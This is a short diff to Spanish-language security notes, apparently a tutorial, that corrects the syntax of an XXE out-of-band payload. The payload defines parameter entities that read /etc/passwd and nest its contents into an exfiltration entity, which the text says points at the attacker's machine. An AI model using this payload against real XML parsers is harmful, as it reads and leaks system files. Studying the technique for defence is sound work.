@@ -99,7 +99,7 @@
 	Se realiza con una entidad de parámetro externa que apunta a un recurso en la máquina de atacante con las entidades siguientes:
 	``` java
 	<!ENTITY % file SYSTEM "file:///etc/passwd">
-	<!ENTITY %eval "<!ENTITY &#x25; exfil SYSTEM 'file:///handler/%file;'">
+	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///handler/%file;'>">
 	%eval;
 	%exfil;
 	```
